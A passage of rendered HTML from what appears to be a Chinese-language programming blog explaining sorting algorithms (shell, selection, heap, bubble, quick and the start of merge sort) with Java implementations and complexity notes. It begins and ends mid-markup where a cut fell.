class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ShellSort</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//希尔排序</span></span><br><span class=\"line\">\t\tshellSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">shellSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//设置步长</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> gap = arr.length/<span class=\"number\">2</span>; </span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(gap&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=gap; j&lt;arr.length; j++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">int</span> i=j;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//插入排序</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">while</span>(i&gt;=gap &amp;&amp; arr[i-gap]&gt;arr[i]) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> temp = arr[i-gap];</span><br><span class=\"line\">\t\t\t\t\tarr[i-gap] = arr[i];</span><br><span class=\"line\">\t\t\t\t\tarr[i] = temp;</span><br><span class=\"line\">\t\t\t\t\ti -= gap;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tgap = gap/<span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"选择排序\"><a href=\"#选择排序\" class=\"headerlink\" title=\"选择排序\"></a>选择排序</h3><h4 id=\"直接选择\"><a href=\"#直接选择\" class=\"headerlink\" title=\"直接选择\"></a>直接选择</h4><p><img src=\"/images/sort/selection_sort.gif\" alt=\"selection_sort\"></p>\n<ul>\n<li>选择排序(不稳定)</li>\n<li>不断地选择剩余元素中的最小者</li>\n<li>时间复杂度O(n^2)</li>\n<li>空间复杂度O(1)</li>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SelectionSort</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//选择排序</span></span><br><span class=\"line\">\t\tselectionSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">selectionSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> min_index = i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i+<span class=\"number\">1</span>; j&lt;arr.length; j++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(arr[j] &lt; arr[min_index]) &#123;</span><br><span class=\"line\">\t\t\t\t\tmin_index = j;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> temp = arr[min_index];</span><br><span class=\"line\">\t\t\tarr[min_index] = arr[i];</span><br><span class=\"line\">\t\t\tarr[i] = temp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"堆排序\"><a href=\"#堆排序\" class=\"headerlink\" title=\"堆排序\"></a>堆排序</h4><p><img src=\"/images/sort/heapSort.gif\" alt=\"heapSort\"></p>\n<ul>\n<li>堆排序(不稳定)</li>\n<li>时间复杂度 O(nlogn)</li>\n<li>空间复杂度O(1)</li>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HeapSort</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//堆排序</span></span><br><span class=\"line\">\t\theapSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">heapSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> len = arr.length -<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = len/<span class=\"number\">2</span> - <span class=\"number\">1</span>; i &gt;=<span class=\"number\">0</span>; i --)&#123; <span class=\"comment\">//堆构造</span></span><br><span class=\"line\">            heapAdjust(arr,i,len);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (len &gt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        \t<span class=\"comment\">//将堆顶元素与尾节点交换后，长度减1，尾元素最大</span></span><br><span class=\"line\">            swap(arr,<span class=\"number\">0</span>,len--);    </span><br><span class=\"line\">            <span class=\"comment\">//再次对堆进行调整</span></span><br><span class=\"line\">            heapAdjust(arr,<span class=\"number\">0</span>,len);    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">heapAdjust</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr,<span class=\"keyword\">int</span> i,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">int</span> left,right,j ;</span><br><span class=\"line\">    \t<span class=\"keyword\">while</span>((left = <span class=\"number\">2</span>*i+<span class=\"number\">1</span>) &lt;= len)&#123;    <span class=\"comment\">//判断当前父节点有无左节点（即有无孩子节点，left为左节点）</span></span><br><span class=\"line\">    \t\tright = left + <span class=\"number\">1</span>;  <span class=\"comment\">//右节点</span></span><br><span class=\"line\">    \t\tj = left;   <span class=\"comment\">//j\"指针指向左节点\"</span></span><br><span class=\"line\">    \t\t<span class=\"comment\">//右节点大于左节点</span></span><br><span class=\"line\">    \t\t<span class=\"keyword\">if</span>(j &lt; len &amp;&amp; arr[left] &lt; arr[right])    </span><br><span class=\"line\">    \t\t\t<span class=\"comment\">//当前把\"指针\"指向右节点</span></span><br><span class=\"line\">    \t\t\tj ++;     </span><br><span class=\"line\">    \t\t<span class=\"comment\">//将父节点与孩子节点交换（如果上面if为真，则arr[j]为右节点，如果为假arr[j]则为左节点）</span></span><br><span class=\"line\">    \t\t<span class=\"keyword\">if</span>(arr[i] &lt; arr[j])    </span><br><span class=\"line\">    \t\t\tswap(arr,i,j);</span><br><span class=\"line\">    \t\t<span class=\"comment\">//说明比孩子节点都大，直接跳出循环语句</span></span><br><span class=\"line\">    \t\t<span class=\"keyword\">else</span>         </span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\ti = j;</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr,<span class=\"keyword\">int</span> i,<span class=\"keyword\">int</span> len)</span></span>&#123;</span><br><span class=\"line\">             </span><br><span class=\"line\">    \t<span class=\"keyword\">int</span> temp = arr[i];</span><br><span class=\"line\">        arr[i] = arr[len];</span><br><span class=\"line\">        arr[len] = temp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"交换排序\"><a href=\"#交换排序\" class=\"headerlink\" title=\"交换排序\"></a>交换排序</h3><h4 id=\"冒泡排序\"><a href=\"#冒泡排序\" class=\"headerlink\" title=\"冒泡排序\"></a>冒泡排序</h4><p><img src=\"/images/sort/bubble_sort.gif\" alt=\"bubble_sort\"></p>\n<ul>\n<li>冒泡排序(稳定)</li>\n<li>时间复杂度O(n^2)</li>\n<li>空间复杂度O(1)</li>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestBubbleSort</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//冒泡排序</span></span><br><span class=\"line\">\t\tbubbleSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">bubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j&lt;arr.length-i; j++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(arr[j-<span class=\"number\">1</span>]&gt;arr[j]) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> temp = arr[j-<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t\t\tarr[j-<span class=\"number\">1</span>] = arr[j];</span><br><span class=\"line\">\t\t\t\t\tarr[j] = temp;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h4><p><img src=\"/images/sort/Quicksort-example.gif\" alt=\"Quicksort-example\"></p>\n<ul>\n<li>快排 = 冒泡 + 分治 + 递归</li>\n<li>时间复杂度 O(nlogn)</li>\n<li>空间复杂度O(logn)</li>\n</ul>\n<ul>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestQuickSort</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">partition</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//指定左指针i和右指针j</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> i = low;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> j = high;</span><br><span class=\"line\">\t\t<span class=\"comment\">//将第一个数作为基准值，挖坑</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> x = arr[low];</span><br><span class=\"line\">\t\t<span class=\"comment\">//使用循环实现分区操作</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(i&lt;j) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//1. 从右向左移动j, 找到第一个小于基准值的值</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span>(arr[j] &gt;= x &amp;&amp; i&lt;j) &#123;</span><br><span class=\"line\">\t\t\t\tj--;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//2. 将找到的数填入i的(坑)位置, i++</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(i&lt;j) &#123;</span><br><span class=\"line\">\t\t\t\tarr[i] = arr[j];</span><br><span class=\"line\">\t\t\t\ti++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//3. 从左向右移动i, 找到第一个大于等于基准值的值</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">while</span>(arr[i] &lt;= x &amp;&amp; i&lt;j) &#123;</span><br><span class=\"line\">\t\t\t\ti++;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//4. 将找到的数填入j的位置, j--</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(i&lt;j) &#123;</span><br><span class=\"line\">\t\t\t\tarr[j] = arr[i];</span><br><span class=\"line\">\t\t\t\tj--;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">//使用基准值填坑，此即基准值的最终位置</span></span><br><span class=\"line\">\t\tarr[i] = x; <span class=\"comment\">// arr[j] = x;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//返回基准值的位置索引</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(low &lt; high) &#123;<span class=\"comment\">//递归结束条件</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//分区操作，将一个数组分成两个分区，返回分区界限索引</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> index = partition(arr, low, high);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//对左分区进行快排</span></span><br><span class=\"line\">\t\t\tquickSort(arr, low, index-<span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//对右分区进行快排</span></span><br><span class=\"line\">\t\t\tquickSort(arr, index+<span class=\"number\">1</span>, high);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">quickSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> low = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> high = arr.length - <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tquickSort(arr, low, high);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//快速排序</span></span><br><span class=\"line\">\t\tquickSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"归并排序\"><a href=\"#归并排序\" class=\"headerlink\" title=\"归并排序\"></a>归并排序</h3><p><img src=\"/images/sort/mergeSort.gif\" alt=\"mergeSort\"></p>\n<ul>\n<li>归并排序(稳定)</li>\n<li>递归 + 合并</li>\n<li>时间复杂度 O(nlogn)</li>\n<li>空间复杂度O(n) +O(logn)</li>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MergeSort</span> </span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//归并排序</span></span><br><span class=\"line\">\t\tmergeSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span 